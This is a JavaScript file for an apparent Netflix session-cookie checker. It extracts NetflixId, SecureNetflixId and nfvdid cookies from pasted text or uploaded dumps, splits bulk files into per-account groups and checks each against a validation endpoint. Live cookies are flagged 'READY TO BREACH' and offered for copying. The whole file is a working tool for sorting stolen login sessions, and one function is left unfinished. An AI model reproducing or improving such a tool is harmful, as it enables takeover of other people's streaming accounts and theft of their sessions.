<script>
var selectedPlatform='mobile';
var lastValidCookie='';
var validCookies=[];
var invalidCookies=[];

function updateClock(){document.getElementById('clock').textContent=new Date().toLocaleTimeString('en-US',{hour12:false})}
setInterval(updateClock,1000);updateClock();

function selectPlatform(btn){var all=document.querySelectorAll('.platform-btn');for(var i=0;i<all.length;i++)all[i].classList.remove('active');btn.classList.add('active');selectedPlatform=btn.dataset.p}

function playBeep(freq){
  try{
    var ctx=new (window.AudioContext||window.webkitAudioContext)();
    var o=ctx.createOscillator();
    o.type='sine';o.frequency.setValueAtTime(freq,ctx.currentTime);
    o.connect(ctx.destination);o.start();o.stop(ctx.currentTime+0.1);
  }catch(e){}
}

/* UNIVERSAL EXTRACTOR
   Handles:
   - chrome devtools table (tab-separated, 7+ cells)
   - cookie string "key=value; key=value"
   - "key=value" on separate lines
   - json array of {name, value}
   - json object {name: value}
   - netscape cookie file (tab-separated, 7 fields, first may be #comment)
*/
function extractCookies(raw){
  if(!raw) return '';
  var keep=['netflixid','securenetflixid','nfvdid'];
  var out={};

  // 1) try devtools table / netscape format (tab-separated)
  var lines=raw.split('\n');
  for(var i=0;i<lines.length;i++){
    var line=lines[i];
    if(!line.trim()) continue;
    if(line.charAt(0)==='#' && line.charAt(1)===' ') continue;
    var cells=line.split('\t');
    if(cells.length>=7){
      var name='';
      var value='';
      // netscape: domain \t flag \t path \t secure \t expiry \t name \t value
      // devtools also same order
      name=cells[5]?cells[5].trim():'';
      value=cells.slice(6).join('\t').trim();
      var low=name.toLowerCase();
      if(keep.indexOf(low)>=0 && value) out[low]=name+'='+value;
    }
  }

  // 2) cookie string "key=value; key=value" or "key=value" per line
  if(Object.keys(out).length===0){
    var parts=raw.split(/[;\n]/);
    for(var j=0;j<parts.length;j++){
      var p=parts[j].trim();
      if(!p) continue;
      var eq=p.indexOf('=');
      if(eq<0) continue;
      var k=p.substring(0,eq).trim().toLowerCase();
      var v=p.substring(eq+1).trim();
      if(keep.indexOf(k)>=0 && v) out[k]=p.substring(0,eq).trim()+'='+v;
    }
  }

  // 3) json array / object
  if(Object.keys(out).length===0){
    try{
      var obj=JSON.parse(raw);
      if(Array.isArray(obj)){
        for(var m=0;m<obj.length;m++){
          var c=obj[m];
          if(c && c.name && c.value && keep.indexOf(String(c.name).toLowerCase())>=0)
            out[String(c.name).toLowerCase()]=c.name+'='+c.value;
        }
      }else if(obj && typeof obj==='object'){
        for(var key in obj){
          var low2=key.toLowerCase();
          if(keep.indexOf(low2)>=0 && obj[key]) out[low2]=key+'='+obj[key];
        }
      }
    }catch(e){}
  }

  var arr=[];
  if(out['netflixid']) arr.push(out['netflixid']);
  if(out['securenetflixid']) arr.push(out['securenetflixid']);
  if(out['nfvdid']) arr.push(out['nfvdid']);
  return arr.join('; ');
}

async function validateCookie(normalized){
  try{
    var res=await fetch('/api/validate',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cookie:normalized,device:selectedPlatform})});
    var data=await res.json();
    return data.ok?{ok:true,profile:data.profile||'unknown'}:{ok:false,error:data.error||'rejected'};
  }catch(e){
    return {ok:false,error:e.message};
  }
}

async function checkSingleCookie(){
  var input=document.getElementById('singleCookieInput').value.trim();
  var resultBox=document.getElementById('singleCheckResult');
  if(!input){resultBox.className='check-result invalid';resultBox.innerHTML='ENTER A COOKIE';return}
  var normalized=extractCookies(input);
  if(!normalized){resultBox.className='check-result invalid';resultBox.innerHTML='NO NETFLIX COOKIE KEYS FOUND';playBeep(300);return}

  resultBox.className='check-result';
  resultBox.style.display='block';
  resultBox.style.background='rgba(255,204,0,0.1)';
  resultBox.style.border='1px solid #ffcc00';
  resultBox.style.color='#ffcc00';
  resultBox.textContent='checking on netflix server...';

  var r=await validateCookie(normalized);
  if(r.ok){
    lastValidCookie=normalized;
    validCookies=[{cookie:normalized,profile:r.profile}];
    invalidCookies=[];
    resultBox.className='check-result valid';
    resultBox.innerHTML='LIVE COOKIE<br><span style="font-size:11px">profile: '+r.profile+'</span>';
    document.getElementById('actionButtons').style.display='flex';
    document.getElementById('cookieCount').textContent='1';
    document.getElementById('cookieStatus').textContent='LIVE - READY TO BREACH';
    playBeep(900);
    renderResults();
    addHistory('single check',1,0);
  }else{
    resultBox.className='check-result invalid';
    resultBox.innerHTML='DEAD - '+r.error;
    playBeep(300);
    addHistory('single check',0,1);
  }
}

function universalSplit(text){
  // step 1: try JSON parse whole text
  var trimmed=text.trim();
  if(trimmed.charAt(0)==='[' || trimmed.charAt(0)==='{'){
    try{
      var parsed=JSON.parse(trimmed);
      if(Array.isArray(parsed)) return [trimmed];
      if(typeof parsed==='object') return [trimmed];
    }catch(e){}
  }

  // step 2: line-based grouping
  var lines=text.split('\n').map(function(l){return l.replace(/\r$/,'')});
  var groups=[];
  var cur=[];
  var mode=null; // 'table' or 'string'

  function flush(){ if(cur.length){groups.push(cur.join('\n'));cur=[]} }

  for(var i=0;i<lines.length;i++){
    var line=lines[i];
    if(!line.trim()){
      // blank line separates chunks in string mode
      if(mode!=='table'){ flush(); }
      continue;
    }
    if(line.charAt(0)==='#' && line.charAt(1)===' '){ continue; }

    var cells=line.split('\t');
    var isTable=cells.length>=7;

    if(isTable){
      // is this a new netflix cookie row or a continuation line?
      var name=cells[5]?cells[5].trim().toLowerCase():'';
      var isKnown=name && (name==='netflixid'||name==='securenetflixid'||name==='nfvdid'||name==='netflixuserid'||name.indexOf('netflix')===0||name==='gsid'||name==='pas'||name==='optanonconsent'||name==='profilesnewsession');
      if(mode==='string'){ flush(); }
      if(mode!=='table'){
        mode='table';
      }
      // if the current group already has both netflixid and securenetflixid, and this is known new cookie -> flush
      var hasBoth=cur.some(function(x){
        var cc=x.split('\t');
        if(cc.length<6) return false;
        var n=cc[5]?cc[5].trim().toLowerCase():'';
        return n==='netflixid'||n==='securenetflixid';
      });
      if(hasBoth && isKnown){
        flush();
      }
      cur.push(line);
    }else{
      // string mode
      if(mode==='table'){ flush(); }
      mode='string';
      // if this line looks like a new "cookie string", treat as its own chunk
      // heuristic: if it contains "NetflixId=" or "SecureNetflixId=" or "nfvdid="
      var lower=line.toLowerCase();
      if(lower.indexOf('netflixid=')>=0 || lower.indexOf('securenetflixid=')>=0 || lower.indexOf('nfvdid=')>=0){
        cur.push(line);
        // keep collecting until next blank or new cookie start
      }else{
        cur.push(line);
      }
    }
  }
  flush();
  return groups;
}

async function handleFileUpload(event){
  var file=event.target.files[0];
  if(!file){return}
  var validityBox=document.getElementById('validityBox');
  var loader=document.getElementById('loader');
  var results=document.getElementById('results');

  loader.classList.add('on');
  loader.textContent='reading file...';
  validityBox.className='validity-box';
  validityBox.style.display='none';
  results.style.display='none';

  var text='';

  try{
    if(file.name.toLowerCase().endsWith('.pdf')){
      var buf=await file.arrayBuffer();
      var pdf=await pdfjsLib.getDocument({data:buf}).promise;
      var full='';
      for(var p=1;p<=pdf.numPages;p++){
        var page=await pdf.getPage(p);
        var content=await page.getTextContent();
        var pageText=content.items.map(function(it){return it.str}).join('\n');
        full+=pageText+'\n';
      }
      text=full;
    }else{
      text=await file.text();
    }
  }catch(e){
    loader.classList.remove('on');
    validityBox.className='validity-box invalid';
    validityBox.style.display='block';
    validityBox.innerHTML='file read error: '+e.message;
    return;
  }

  var groups=universalSplit(text);

  validCookies=[];
  invalidCookies=[];

  for(var g=0;g<groups.length;g++){
    var norm=extractCookies(groups[g]);
    if(!norm) continue;
    var r=await validateCookie(norm);
    if(r.ok){
      validCookies.push({cookie:norm,profile:r.profile});
    }else{
      invalidCookies.push({cookie:norm,error:r.error});
    }
    loader.textContent='scanned '+(g+1)+'/'+groups.length+'...';
  }

  loader.classList.remove('on');
  document.getElementById('cookieCount').textContent=validCookies.length;
  document.getElementById('cookieStatus').textContent=validCookies.length>0?'LIVE - READY TO BREACH':'NO LIVE COOKIES';

  if(validCookies.length>0){
    lastValidCookie=validCookies[0].cookie;
    document.getElementById('actionButtons').style.display='flex';
    validityBox.className='validity-box valid';
    validityBox.style.display='block';
    validityBox.innerHTML=validCookies.length+' LIVE COOKIE(S) — '+invalidCookies.length+' invalid';
    playBeep(900);
  }else{
    validityBox.className='validity-box invalid';
    validityBox.style.display='block';
    validityBox.innerHTML='0 LIVE COOKIES (found '+(validCookies.length+invalidCookies.length)+' total)';
    playBeep(300);
  }

  renderResults();
  addHistory(file.name,validCookies.length,invalidCookies.length);
}

function renderResults(){
  var html='';
  var results=document.getElementById('results');

  if(validCookies.length===0 && invalidCookies.length===0){
    results.style.display='none';
    return;
  }

  results.style.display='block';

  if(validCookies.length>0){
    html+='<div class="result-section"><div class="result-header valid">VALID COOKIES ('+validCookies.length+')</div>';
    for(var i=0;i<validCookies.length;i++){
      var v=validCookies[i];
      html+='<div class="cookie-item"><span class="num">#'+(i+1)+' — '+v.profile+'</span><span class="data">'+v.cookie+'</span>';
      html+='<button class="copy-btn" onclick="copyCookie('+i+')">COPY</button></div>';
    }
    html+='</div>';
  }

  if(invalidCookies.length>0){
    html+='<div class="result-section"><div class="result-header invalid">INVALID COOKIES ('+invalidCookies.length+')</div>';

}

/* HISTORY */
function getHistory(){
  try{ return JSON.parse(localStorage.getItem('nf_scan_history')||'[]'); }catch(e){ return []; }
}
function saveHistory(h){
  try{ localStorage.setItem('nf_scan_history',JSON.stringify(h.slice(0,50))); }catch(e){}
}
function addHistory(source,valid,invalid){
  var h=getHistory();
  h.unshift({time:new Date().toLocaleString(),source:source,valid:valid,invalid:invalid});
  saveHistory(h);
}
function openHistory(){
  var list=document.getElementById('historyList');
  var h=getHistory();
  if(h.length===0){
    list.innerHTML='<div class="history-empty">no history yet</div>';
  }else{
    var html='';
    for(var i=0;i<h.length;i++){
      html+='<div class="history-item"><span class="time">'+h[i].time+'</span><span class="counts">source: '+h[i].source+'<br>valid: '+h[i].valid+' | invalid: '+h[i].invalid+'</span></div>';
    }
    list.innerHTML=html;
  }
  document.getElementById('historyPanel').classList.add('on');
}
function closeHistory(){
  document.getElementById('historyPanel').classList.remove('on');
}
